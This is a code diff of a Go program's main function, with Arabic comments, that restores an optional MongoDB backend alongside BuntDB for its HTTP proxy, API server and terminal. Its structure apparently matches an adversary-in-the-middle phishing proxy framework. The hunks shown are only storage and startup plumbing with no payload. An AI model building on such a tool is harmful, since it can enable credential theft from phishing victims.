@@ -151,8 +151,6 @@ func main() {
 	var db database.IDatabase
 	var buntDb *database.Database
 
-	// مؤقتاً: نتجاهل إعداد MongoDB ونستخدم BuntDB فقط حتى نصلح المشكلة
-	/*
 	if *use_mongo {
 		// استخدام MongoDB
 		db_name := *mongo_db_name
@@ -171,40 +169,39 @@ func main() {
 
 		fmt.Printf(lg("تم") + e)
 	} else {
-	*/	
-	// استخدام BuntDB (التنفيذ الحالي)
-	storage_path := ""
-	if *db_path != "" {
-		storage_path = *db_path
-	} else if *cfg_dir != "" {
-		storage_path = filepath.Join(*cfg_dir, "data.db")
-	} else {
-		ex_path, err := os.Executable()
+		// استخدام BuntDB (التنفيذ الحالي)
+		storage_path := ""
+		if *db_path != "" {
+			storage_path = *db_path
+		} else if *cfg_dir != "" {
+			storage_path = filepath.Join(*cfg_dir, "data.db")
+		} else {
+			ex_path, err := os.Executable()
+			if err != nil {
+				log.Fatal("%v", err)
+			}
+			ex_dir := filepath.Dir(ex_path)
+			storage_path = filepath.Join(ex_dir, "data.db")
+		}
+
+		fmt.Printf("\n\n")
+		fmt.Printf(lb(" تهيئة قاعدة البيانات... ") + e)
+		fmt.Printf("%s", storage_path)
+
+		err = os.MkdirAll(filepath.Dir(storage_path), 0711)
 		if err != nil {
 			log.Fatal("%v", err)
 		}
-		ex_dir := filepath.Dir(ex_path)
-		storage_path = filepath.Join(ex_dir, "data.db")
+
+		fdb, err := database.NewDatabase(storage_path)
+		if err != nil {
+			log.Fatal("%v", err)
+		}
+		db = fdb
+		buntDb = fdb
+
+		fmt.Printf(lg("تم") + e)
 	}
-
-	fmt.Printf("\n\n")
-	fmt.Printf(lb(" تهيئة قاعدة البيانات... ") + e)
-	fmt.Printf("%s", storage_path)
-
-	err = os.MkdirAll(filepath.Dir(storage_path), 0711)
-	if err != nil {
-		log.Fatal("%v", err)
-	}
-
-	fdb, err := database.NewDatabase(storage_path)
-	if err != nil {
-		log.Fatal("%v", err)
-	}
-	db = fdb
-	buntDb = fdb
-
-	fmt.Printf(lg("تم") + e)
-	//}
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
 	if err != nil {
@@ -249,7 +246,7 @@ func main() {
 
 	// نتحقق ما إذا كان نستخدم BuntDB أو MongoDB ونمرر واجهة قاعدة البيانات المناسبة
 	var hp *core.HttpProxy
-	/*if *use_mongo {
+	if *use_mongo {
 		// استخدام النوع المناسب لـ MongoDB
 		mongoDB, ok := db.(*database.MongoDatabase)
 		if !ok {
@@ -257,10 +254,10 @@ func main() {
 			return
 		}
 		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, mongoDB.AsDatabaseType(), bl, *developer_mode)
-	} else {*/
-	// استخدام BuntDB
-	hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
-	//}
+	} else {
+		// استخدام BuntDB
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
+	}
 	
 	hp.Start()
 
@@ -280,7 +277,7 @@ func main() {
 		var api *core.ApiServer
 		var err error
 		
-		/*if *use_mongo {
+		if *use_mongo {
 			// نستخدم النوع المناسب من قاعدة البيانات
 			mongoDB, ok := db.(*database.MongoDatabase)
 			if !ok {
@@ -288,9 +285,9 @@ func main() {
 				return
 			}
 			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, mongoDB.AsDatabaseType())
-		} else {*/
-		api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
-		//}
+		} else {
+			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
+		}
 		
 		if err != nil {
 			log.Fatal("api server: %v", err)
@@ -304,16 +301,16 @@ func main() {
 	var t *core.Terminal
 	var err2 error
 	
-	/*if *use_mongo {
+	if *use_mongo {
 		mongoDB, ok := db.(*database.MongoDatabase)
 		if !ok {
 			log.Fatal("فشل تحويل نوع MongoDB")
 			return
 		}
 		t, err2 = core.NewTerminal(hp, cfg, crt_db, mongoDB.AsDatabaseType(), *developer_mode)
-	} else {*/
-	t, err2 = core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
-	//}
+	} else {
+		t, err2 = core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
+	}
 	
 	if err2 != nil {
 		log.Fatal("%v", err2)
